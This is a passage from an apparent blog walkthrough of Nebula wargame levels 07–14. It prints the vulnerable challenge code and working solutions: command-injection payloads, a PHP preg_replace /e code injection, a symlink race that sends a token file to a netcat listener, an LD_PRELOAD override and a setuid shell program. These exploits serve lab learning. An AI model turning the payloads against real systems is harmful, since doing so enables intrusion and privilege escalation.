&lt;p&gt;&lt;a href=&#34;https://exploit-exercises.com/nebula/level07/&#34;&gt;Level07&amp;rsquo;s Description&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;The flag07 user was writing their very first perl program that allowed them to ping hosts to see if they were reachable from the web server.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;With the description we are provided with the source code of a small Perl program:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-perl&#34;&gt;#!/usr/bin/perl

use CGI qw{param};

print &amp;quot;Content-type: text/html\n\n&amp;quot;;

sub ping {
  $host = $_[0];

  print(&amp;quot;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;Ping results&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&amp;lt;pre&amp;gt;&amp;quot;);

  @output = `ping -c 3 $host 2&amp;gt;&amp;amp;1`;
  foreach $line (@output) { print &amp;quot;$line&amp;quot;; }

  print(&amp;quot;&amp;lt;/pre&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&amp;quot;);

}

# check if Host set. if not, display normal page, etc

ping(param(&amp;quot;Host&amp;quot;));
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This script has a very obvious command injection problem in the ping command. It also looks like something that should be served by a web server. In the &lt;code&gt;flag07&lt;/code&gt; directory one can see a &lt;code&gt;thttpd.conf&lt;/code&gt; file which contains the port of the webserver serving this script on.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level07@nebula:/home/flag07$ grep port thttpd.conf
# Specifies an alternate port number to listen on.
port=7007
# all hostnames supported on the local machine. See thttpd(8) for details.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Exploiting the vulnerability simply meant that we have to inject commands into the &lt;code&gt;Host&lt;/code&gt; parameter. I normally use python&amp;rsquo;s urllib to ensure that fields are properly url encoded etc.&lt;/p&gt;

&lt;p&gt;So, to solve level07:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;~ » curl -v &amp;quot;http://192.168.217.239:7007/index.cgi?$(python -c &#39;import urllib; print urllib.urlencode({ &amp;quot;Host&amp;quot; : &amp;quot;127.0.0.1 &amp;amp;&amp;amp; gcc /var/tmp/shell.c -o /var/tmp/flag07 &amp;amp;&amp;amp; chmod 4777 /var/tmp/flag07&amp;quot; })&#39;)&amp;quot;
* Hostname was NOT found in DNS cache
*   Trying 192.168.217.239...
* Connected to 192.168.217.239 (192.168.217.239) port 7007 (#0)
&amp;gt; GET /index.cgi?Host=127.0.0.1+%26%26+gcc+%2Fvar%2Ftmp%2Fshell.c+-o+%2Fvar%2Ftmp%2Fflag07+%26%26+chmod+4777+%2Fvar%2Ftmp%2Fflag07 HTTP/1.1
&amp;gt; User-Agent: curl/7.37.1
&amp;gt; Host: 192.168.217.239:7007
&amp;gt; Accept: */*
&amp;gt;
* HTTP 1.0, assume close after body
&amp;lt; HTTP/1.0 200 OK
&amp;lt; Content-type: text/html
&amp;lt;
&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;Ping results&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&amp;lt;pre&amp;gt;PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_req=1 ttl=64 time=0.011 ms
64 bytes from 127.0.0.1: icmp_req=2 ttl=64 time=0.023 ms
64 bytes from 127.0.0.1: icmp_req=3 ttl=64 time=0.022 ms

--- 127.0.0.1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 1998ms
rtt min/avg/max/mdev = 0.011/0.018/0.023/0.007 ms
* Closing connection 0
&amp;lt;/pre&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And finally back on the NebulaVM after this curl from my host:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level07@nebula:/home/flag07$ /var/tmp/flag07
sh-4.2$ getflag
You have successfully executed getflag on a target account
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;level08&#34;&gt;level08&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;https://exploit-exercises.com/nebula/level08/&#34;&gt;Level08&amp;rsquo;s Description&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;World readable files strike again. Check what that user was up to, and use it to log into flag08 account.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Logging in as the user &lt;code&gt;level08&lt;/code&gt; reveals a pcap in the &lt;code&gt;flag08&lt;/code&gt; directory:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level08@nebula:~$ cd ~flag08
level08@nebula:/home/flag08$ ls
capture.pcap

level08@nebula:/home/flag08$ file capture.pcap
capture.pcap: tcpdump capture file (little-endian) - version 2.4 (Ethernet, capture length 65535)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I copied the pcap off the box and opened it on my Kali Linux VM with wireshark to investigate:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/nebula_level8_pcap.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Here we can see some data that got captured in clear text. It looks like a telnet session where someone was logging in with the &lt;code&gt;level8&lt;/code&gt; account. The password though has a few dots in it. To make more sense of these, I switched the stream view to hex so that we can try see the ASCII codes of the keypresses.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/nebula_level8_tcp_stream.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;&lt;code&gt;F7&lt;/code&gt; according to the ASCII table is a backspace. That makes this easy :) Considering we have the password &lt;code&gt;backdoor...00Rm8.ate&lt;/code&gt;, substituting the dot with backspaces we end up with &lt;code&gt;backd00Rmate&lt;/code&gt; as the password.&lt;/p&gt;

&lt;p&gt;So, to solve level08:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level08@nebula:/home/flag08$ su - flag08
Password:

flag08@nebula:~$ getflag
You have successfully executed getflag on a target account
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;level09&#34;&gt;level09&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;https://exploit-exercises.com/nebula/level09/&#34;&gt;Level09&amp;rsquo;s Description&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;There’s a C setuid wrapper for some vulnerable PHP code…&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;With the description we are provided with the source code of a small PHP program:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php

function spam($email)
{
  $email = preg_replace(&amp;quot;/\./&amp;quot;, &amp;quot; dot &amp;quot;, $email);
  $email = preg_replace(&amp;quot;/@/&amp;quot;, &amp;quot; AT &amp;quot;, $email);

  return $email;
}

function markup($filename, $use_me)
{
  $contents = file_get_contents($filename);

  $contents = preg_replace(&amp;quot;/(\[email (.*)\])/e&amp;quot;, &amp;quot;spam(\&amp;quot;\\2\&amp;quot;)&amp;quot;, $contents);
  $contents = preg_replace(&amp;quot;/\[/&amp;quot;, &amp;quot;&amp;lt;&amp;quot;, $contents);
  $contents = preg_replace(&amp;quot;/\]/&amp;quot;, &amp;quot;&amp;gt;&amp;quot;, $contents);

  return $contents;
}

$output = markup($argv[1], $argv[2]);

print $output;

?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;In the &lt;code&gt;flag09&lt;/code&gt; directory, we have the above PHP sample as well as a SUID binary.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level09@nebula:~$ cd ~flag09
level09@nebula:/home/flag09$ ls -lh
total 8.0K
-rwsr-x--- 1 flag09 level09 7.1K 2011-11-20 21:22 flag09
-rw-r--r-- 1 root   root     491 2011-11-20 21:22 flag09.php
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;At first I managed to solve this one really fast. When &lt;code&gt;flag09&lt;/code&gt; is invoked with &lt;code&gt;-h&lt;/code&gt;, it seemed like it passed the arguments directly to a PHP binary. So, I was able to drop into an interactive PHP shell and execute commands from there:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level09@nebula:/home/flag09$ ./flag09 -a
Interactive shell

php &amp;gt; system(&amp;quot;id&amp;quot;);
uid=1010(level09) gid=1010(level09) euid=990(flag09) groups=990(flag09),1010(level09)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;With this I would have been able to prepare the small &lt;code&gt;flag09&lt;/code&gt; setuid shell and complete the level. However, I did not think this was the intended route so I continued to investigate the PHP program further.&lt;/p&gt;

&lt;p&gt;The PHP code basically had 2 main functions. &lt;code&gt;markup()&lt;/code&gt; and &lt;code&gt;spam()&lt;/code&gt;. &lt;code&gt;markup()&lt;/code&gt; would read the contents of a file (who’s location is read as the first command line argument), and using regex, search for a pattern matching &lt;code&gt;[email addr]&lt;/code&gt; where &lt;em&gt;addr&lt;/em&gt; will be the extracted part. It then as a callback executes &lt;code&gt;spam()&lt;/code&gt; which will convert &lt;code&gt;.&lt;/code&gt; to &lt;code&gt;dot&lt;/code&gt; and &lt;code&gt;@&lt;/code&gt; to &lt;code&gt;AT&lt;/code&gt;. I took a really long time researching the &lt;code&gt;preg_replace()&lt;/code&gt; functions and potential exploits with it. Eventually I came across a post describing how code injection may be possible when &lt;code&gt;preg_replace()&lt;/code&gt; is called with the &lt;code&gt;e&lt;/code&gt; modifier. &lt;a href=&#34;http://www.madirish.net/402&#34;&gt;This&lt;/a&gt; blogpost explains the vulnerability in pretty great detail. That blogpost coupled with the PHP docs &lt;a href=&#34;http://php.net/manual/en/reference.pcre.pattern.modifiers.php&#34;&gt;here&lt;/a&gt; helps develop a payload for exploitation. The PHP documentation has a sample of &lt;code&gt;&amp;lt;h1&amp;gt;{${eval($_GET[php_code])}}&amp;lt;/h1&amp;gt;&lt;/code&gt; which is what I used to finish the final payload for this level.&lt;/p&gt;

&lt;p&gt;Another thing to note about the PHP code is the &lt;code&gt;$use_me&lt;/code&gt; variable passed to the &lt;code&gt;markup()&lt;/code&gt; function. It only gets declared and never gets used later. I think the developer of this level wanted this to be a form of hint, but it was handy to get code execution as argument 2 on the command line will be the command we want to execute :)&lt;/p&gt;

&lt;p&gt;So, to solve level09:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level09@nebula:/home/flag09$ echo -ne &amp;quot;[email {\${system(\$use_me)}}]&amp;quot; &amp;gt; /var/tmp/flag09.txt

level09@nebula:/home/flag09$ cat /var/tmp/flag09.txt
[email {${system($use_me)}}]

level09@nebula:/home/flag09$ ./flag09 /var/tmp/flag09.txt &amp;quot;gcc /var/tmp/shell.c -o /var/tmp/flag09; chmod 4777 /var/tmp/flag09&amp;quot;
PHP Notice:  Undefined variable:  in /home/flag09/flag09.php(15) : regexp code on line 1

level09@nebula:/home/flag09$ /var/tmp/flag09
sh-4.2$ getflag
You have successfully executed getflag on a target account
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;intermission&#34;&gt;intermission&lt;/h3&gt;

&lt;p&gt;From here, the levels became noticeably harder for me. A lot of the levels had me researching new things that I was unsure of. :)&lt;/p&gt;

&lt;p&gt;I wont detail all of the failed attempts. There were so many. Only the successes (and if a failure was significant) will land here :P
Lets get to them!&lt;/p&gt;

&lt;h2 id=&#34;level10&#34;&gt;level10&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;https://exploit-exercises.com/nebula/level10/&#34;&gt;Level10&amp;rsquo;s Description&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;The setuid binary at /home/flag10/flag10 binary will upload any file given, as long as it meets the requirements of the access() system call.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;With the description we are provided with the source code of a small PHP program:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;fcntl.h&amp;gt;
#include &amp;lt;errno.h&amp;gt;
#include &amp;lt;sys/socket.h&amp;gt;
#include &amp;lt;netinet/in.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

int main(int argc, char **argv)
{
  char *file;
  char *host;

  if(argc &amp;lt; 3) {
      printf(&amp;quot;%s file host\n\tsends file to host if you have access to it\n&amp;quot;, argv[0]);
      exit(1);
  }

  file = argv[1];
  host = argv[2];

  if(access(argv[1], R_OK) == 0) {
      int fd;
      int ffd;
      int rc;
      struct sockaddr_in sin;
      char buffer[4096];

      printf(&amp;quot;Connecting to %s:18211 .. &amp;quot;, host); fflush(stdout);

      fd = socket(AF_INET, SOCK_STREAM, 0);

      memset(&amp;amp;sin, 0, sizeof(struct sockaddr_in));
      sin.sin_family = AF_INET;
      sin.sin_addr.s_addr = inet_addr(host);
      sin.sin_port = htons(18211);

      if(connect(fd, (void *)&amp;amp;sin, sizeof(struct sockaddr_in)) == -1) {
          printf(&amp;quot;Unable to connect to host %s\n&amp;quot;, host);
          exit(EXIT_FAILURE);
      }

#define HITHERE &amp;quot;.oO Oo.\n&amp;quot;
      if(write(fd, HITHERE, strlen(HITHERE)) == -1) {
          printf(&amp;quot;Unable to write banner to host %s\n&amp;quot;, host);
          exit(EXIT_FAILURE);
      }
#undef HITHERE

      printf(&amp;quot;Connected!\nSending file .. &amp;quot;); fflush(stdout);

      ffd = open(file, O_RDONLY);
      if(ffd == -1) {
          printf(&amp;quot;Damn. Unable to open file\n&amp;quot;);
          exit(EXIT_FAILURE);
      }

      rc = read(ffd, buffer, sizeof(buffer));
      if(rc == -1) {
          printf(&amp;quot;Unable to read from file: %s\n&amp;quot;, strerror(errno));
          exit(EXIT_FAILURE);
      }

      write(fd, buffer, rc);

      printf(&amp;quot;wrote file!\n&amp;quot;);

  } else {
      printf(&amp;quot;You don&#39;t have access to %s\n&amp;quot;, file);
  }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;As the description has it, this program seems to read a file and send its contents to a user specified IP address on tcp/18211. I tested this by opening a netcat listener with &lt;code&gt;nc -lk 18211&lt;/code&gt; and sending myself a file to see what comes out. Obviously, I was not able to send the token that was in the same directory as the &lt;code&gt;flag10&lt;/code&gt; binary as I did not have read access to this.&lt;/p&gt;

&lt;p&gt;The problem with this program through is the fact that it checks if the file can be read using &lt;code&gt;access()&lt;/code&gt;, then only later opens it using &lt;code&gt;open()&lt;/code&gt;. Using this method it may be possible to change out the file before it hits the &lt;code&gt;open()&lt;/code&gt; method. Symlinks are the goto for this kind of problem as they can be easily swapped out by relinking a file as the program runs. It of course helps that the file to read can be user specified. There is actually an acronym for this kind of bug called &lt;a href=&#34;http://en.wikipedia.org/wiki/Time_of_check_to_time_of_use&#34;&gt;TOCTTOU&lt;/a&gt;. The Wikipedia article describes almost exactly the same scenario as we have here.&lt;/p&gt;

&lt;p&gt;My plan of attack was to create a race condition. I would create an infinite loop that relinks a file from something I can actually read back to the token file and vice versa. While this continuous relinking occurs, I would run the affected binary, hoping that we would catch a case where the link swaps out as hoped for sending the token contents to my netcat listener. To increase my chances of the race condition occurring, I put the &lt;code&gt;flag10&lt;/code&gt; binary in its own loop as well.&lt;/p&gt;

&lt;p&gt;So, to solve level10:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level10@nebula:/home/flag10$ while true; do ln -sf /var/tmp/shell.c /var/tmp/flag10-token; ln -sf /home/flag10/token /var/tmp/flag10-token; done &amp;amp;
[1] 14219

# the counties symlink swap is now happening between /var/tmp/shell.c which I can read and /home/flag10/token which I cant.

level10@nebula:/home/flag10$ while true; do ./flag10 /var/tmp/flag10-token 192.168.217.1; done
You don&#39;t have access to /var/tmp/flag10-token
You don&#39;t have access to /var/tmp/flag10-token
Connecting to 192.168.217.1:18211 .. Connected!
Sending file .. wrote file!
Connecting to 192.168.217.1:18211 .. Connected!
Sending file .. wrote file!
Connecting to 192.168.217.1:18211 .. Connected!
Sending file .. wrote file!
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;On my netcat listener I now had:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;~ » nc -lk 18211
.oO Oo.
#include&amp;lt;stdio.h&amp;gt;

int main(void) {
    setresuid(geteuid(), geteuid(), geteuid());
    system(&amp;quot;/bin/sh&amp;quot;);
    return 0;
}

.oO Oo.
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
.oO Oo.
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
.oO Oo.
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
.oO Oo.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;With the token file read, we end the level:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level10@nebula:/home/flag10$ su - flag10
Password:
flag10@nebula:~$ getflag
You have successfully executed getflag on a target account
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;level11&#34;&gt;level11&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;https://exploit-exercises.com/nebula/level11/&#34;&gt;Level11&amp;rsquo;s Description&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;The setuid binary at /home/flag10/flag10 binary will upload any file given, as long as it meets the requirements of the access() system call.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;With the description we are provided with the source code of a small PHP program:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;fcntl.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;sys/mman.h&amp;gt;

/*
 * Return a random, non predictable file, and return the file descriptor for it.
 */

int getrand(char **path)
{
  char *tmp;
  int pid;
  int fd;

  srandom(time(NULL));

  tmp = getenv(&amp;quot;TEMP&amp;quot;);
  pid = getpid();

  asprintf(path, &amp;quot;%s/%d.%c%c%c%c%c%c&amp;quot;, tmp, pid,
      &#39;A&#39; + (random() % 26), &#39;0&#39; + (random() % 10),
      &#39;a&#39; + (random() % 26), &#39;A&#39; + (random() % 26),
      &#39;0&#39; + (random() % 10), &#39;a&#39; + (random() % 26));

  fd = open(*path, O_CREAT|O_RDWR, 0600);
  unlink(*path);
  return fd;
}

void process(char *buffer, int length)
{
  unsigned int key;
  int i;

  key = length &amp;amp; 0xff;

  for(i = 0; i &amp;lt; length; i++) {
      buffer[i] ^= key;
      key -= buffer[i];
  }

  system(buffer);
}

#define CL &amp;quot;Content-Length: &amp;quot;

int main(int argc, char **argv)
{
  char line[256];
  char buf[1024];
  char *mem;
  int length;
  int fd;
  char *path;

  if(fgets(line, sizeof(line), stdin) == NULL) {
      errx(1, &amp;quot;reading from stdin&amp;quot;);
  }

  if(strncmp(line, CL, strlen(CL)) != 0) {
      errx(1, &amp;quot;invalid header&amp;quot;);
  }

  length = atoi(line + strlen(CL));

  if(length &amp;lt; sizeof(buf)) {
      if(fread(buf, length, 1, stdin) != length) {
          err(1, &amp;quot;fread length&amp;quot;);
      }
      process(buf, length);
  } else {
      int blue = length;
      int pink;

      fd = getrand(&amp;amp;path);

      while(blue &amp;gt; 0) {
          printf(&amp;quot;blue = %d, length = %d, &amp;quot;, blue, length);

          pink = fread(buf, 1, sizeof(buf), stdin);
          printf(&amp;quot;pink = %d\n&amp;quot;, pink);

          if(pink &amp;lt;= 0) {
              err(1, &amp;quot;fread fail(blue = %d, length = %d)&amp;quot;, blue, length);
          }
          write(fd, buf, pink);

          blue -= pink;
      }

      mem = mmap(NULL, length, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0);
      if(mem == MAP_FAILED) {
          err(1, &amp;quot;mmap&amp;quot;);
      }
      process(mem, length);
  }

}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I&amp;rsquo;ll admit. This level kicked my ass. Eventually I gave up and resorted to a few hints that could tell me how to proceed. None of the other walkthroughs that I read actually had working exploits for this level either. That which I have tried never got me to even execute &lt;code&gt;getflag&lt;/code&gt; so that it would be happy with the effective user ids. Maybe this level is bugged, but I am not sure :(&lt;/p&gt;

&lt;h2 id=&#34;level12&#34;&gt;level12&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;https://exploit-exercises.com/nebula/level12/&#34;&gt;Level12&amp;rsquo;s Description&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;There is a backdoor process listening on port 50001.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;With the description we are provided with the source code of a small Lua program:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-lua&#34;&gt;local socket = require(&amp;quot;socket&amp;quot;)
local server = assert(socket.bind(&amp;quot;127.0.0.1&amp;quot;, 50001))

function hash(password)
  prog = io.popen(&amp;quot;echo &amp;quot;..password..&amp;quot; | sha1sum&amp;quot;, &amp;quot;r&amp;quot;)
  data = prog:read(&amp;quot;*all&amp;quot;)
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send(&amp;quot;Password: &amp;quot;)
  client:settimeout(60)
  local line, err = client:receive()
  if not err then
      print(&amp;quot;trying &amp;quot; .. line) -- log from where ;\
      local h = hash(line)

      if h ~= &amp;quot;4754a4f4bd5787accd33de887b9250a0691dd198&amp;quot; then
          client:send(&amp;quot;Better luck next time\n&amp;quot;);
      else
          client:send(&amp;quot;Congrats, your token is 413**CARRIER LOST**\n&amp;quot;)
      end

  end

  client:close()
end
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This level had another very obvious command injection vulnerability on the line where a &lt;code&gt;password&lt;/code&gt; variable is piped through &lt;code&gt;sha1sum&lt;/code&gt;. I made a copy of this program and modified it to print me the outputs so that I could prepare a properly formatted command to be used on a socket. The basic idea of the injection was to separate the echo with a &lt;code&gt;;&lt;/code&gt; character and compile my setuid C shell. I then added a hash (#) to ignore the rest of the command what would have been executed.&lt;/p&gt;

&lt;p&gt;So, to solve level12:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level12@nebula:~$ echo &amp;quot;;gcc /var/tmp/shell.c -o /var/tmp/flag12;chmod 4777 /var/tmp/flag12;#&amp;quot; | nc 127.0.0.1 50001
Password: Better luck next time

level12@nebula:~$ /var/tmp/flag12
sh-4.2$ getflag
You have successfully executed getflag on a target account
sh-4.2$
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;level13&#34;&gt;level13&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;https://exploit-exercises.com/nebula/level13/&#34;&gt;Level13&amp;rsquo;s Description&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;There is a security check that prevents the program from continuing execution if the user invoking it does not match a specific user id.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;With the description we are provided with the source code of a small C program:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-lua&#34;&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

#define FAKEUID 1000

int main(int argc, char **argv, char **envp)
{
  int c;
  char token[256];

  if(getuid() != FAKEUID) {
      printf(&amp;quot;Security failure detected. UID %d started us, we expect %d\n&amp;quot;, getuid(), FAKEUID);
      printf(&amp;quot;The system administrators will be notified of this violation\n&amp;quot;);
      exit(EXIT_FAILURE);
  }

  // snip, sorry :)

  printf(&amp;quot;your token is %s\n&amp;quot;, token);

}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This level had me researching for quite some time. I came to learn of ELF DSO&amp;rsquo;s and &lt;code&gt;LD_PRELOAD&lt;/code&gt;. Basically, it is possible to have the dynamic linker preload shared libraries from the &lt;code&gt;LD_PRELOAD&lt;/code&gt; environment variable that may allow for some functions to be modified. &lt;a href=&#34;https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/&#34;&gt;This&lt;/a&gt; article contained most of the magic that was needed to get this level done.&lt;/p&gt;

&lt;p&gt;I decided to &amp;lsquo;override&amp;rsquo; the &lt;code&gt;getuid()&lt;/code&gt; function so that it would return the value of the &lt;code&gt;FAKEUID&lt;/code&gt; constant in the program, instead of the value the real &lt;code&gt;getuid()&lt;/code&gt; would have returned. For that to happen, I looked up the arguments for &lt;code&gt;getuid()&lt;/code&gt; from the man page and copied that for my own purposes. I then compiled it as a shared library with the famous &lt;code&gt;-shared -fPIC&lt;/code&gt; arguments for position independent code and exported the &lt;code&gt;LD_PRELOAD&lt;/code&gt; variable prior to running the binary.&lt;/p&gt;

&lt;p&gt;One important thing to note here is that this &amp;lsquo;hack&amp;rsquo; has a few gotchas. The executing binary and the library needs to be relative to each other. SETUID programs discard the &lt;code&gt;LD_PRELOAD&lt;/code&gt; environment variable (for obvious reasons) so this is not a privilege escalation. In the source code we have received, there is a portion excluded (that probably just prints the token :P) on purpose. This means we can copy the binary and still be able to get the desired effect. Of course, we could also resort to slapping this into a debugger and checking what it is doing under the hood, but given the nature of Nebula, I figured the point is to actually override &lt;code&gt;getuid()&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;So, to solve level13:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level13@nebula:/var/tmp$ cp ~flag13/flag13 .

level13@nebula:/var/tmp$ cat fake_getuid.c
#include&amp;lt;unistd.h&amp;gt;

uid_t getuid(void) {
    return 1000;
}

level13@nebula:/var/tmp$ gcc -shared -fPIC /var/tmp/fake_getuid.c -o /var/tmp/fake_getuid.o

level13@nebula:/var/tmp$ LD_PRELOAD=/var/tmp/fake_getuid.o ./flag13
your token is b705702b-76a8-42b0-8844-3adabbe5ac58

level13@nebula:/var/tmp$ su - flag13
Password:
flag13@nebula:~$ getflag
You have successfully executed getflag on a target account
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;level14&#34;&gt;level14&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;https://exploit-exercises.com/nebula/level14/&#34;&gt;Level14&amp;rsquo;s Description&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;This program resides in /home/flag14/flag14. It encrypts input and writes it to standard output. An encrypted token file is also in that home directory, decrypt it :)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Logged in as user &lt;code&gt;level14&lt;/code&gt;, we see 2 files in the &lt;code&gt;flag14&lt;/code&gt; directory:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level14@nebula:~$ cd ~flag14
level14@nebula:/home/flag14$ ls -lh
total 8.0K
-rwsr-x--- 1 flag14  level14 7.2K 2011-12-05 18:59 flag14
-rw------- 1 level14 level14   37 2011-12-05 18:59 token

level14@nebula:/home/flag14$ cat token
857:g67?5ABBo:BtDA?tIvLDKL{MQPSRQWW.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;token&lt;/code&gt; obviously being the target to decrypt. Running &lt;code&gt;flag14&lt;/code&gt; tells us that it is expecting a &lt;code&gt;-e&lt;/code&gt; flag to encrypt. So, I tested the encryption to see how it behaves:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level14@nebula:/home/flag14$ ./flag14 -e
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^(
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;What immediately jumped out at me was the A&amp;rsquo;s that I had sent it came back as the alphabet. :D After a few tests I came to the conclusion that the key seems to start at 0, and increments with every character. Each characters ASCII value is then incremented by what ever the current value of the key is. To test this theory, I wrote a small python script to replicate this behavior:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/python

# exploit-exercises level14 cryptor

string = &#39;AABBCCDDEEFFGG&#39;
key = 0
result = &#39;&#39;

print &#39;String: {s}\nStrlen: {l}\t&#39;.format(s = string, l = len(string))

for char in string:
    print &#39;Key: {key}\t Char: {char}\t Ord: {ord}\t Res: {res}&#39;.format(
        key = key, char = char, ord = ord(char), res = chr(ord(char) + key)
    )
    result += chr(ord(char) + key)
    key += 1

print &#39;\nResult: {res}&#39;.format(res = result)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Running this meant that the output would be:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;~ # python crypt.py
String: AABBCCDDEEFFGG
Strlen: 14
Key: 0   Char: A     Ord: 65     Res: A
Key: 1   Char: A     Ord: 65     Res: B
Key: 2   Char: B     Ord: 66     Res: D
Key: 3   Char: B     Ord: 66     Res: E
Key: 4   Char: C     Ord: 67     Res: G
Key: 5   Char: C     Ord: 67     Res: H
Key: 6   Char: D     Ord: 68     Res: J
Key: 7   Char: D     Ord: 68     Res: K
Key: 8   Char: E     Ord: 69     Res: M
Key: 9   Char: E     Ord: 69     Res: N
Key: 10  Char: F     Ord: 70     Res: P
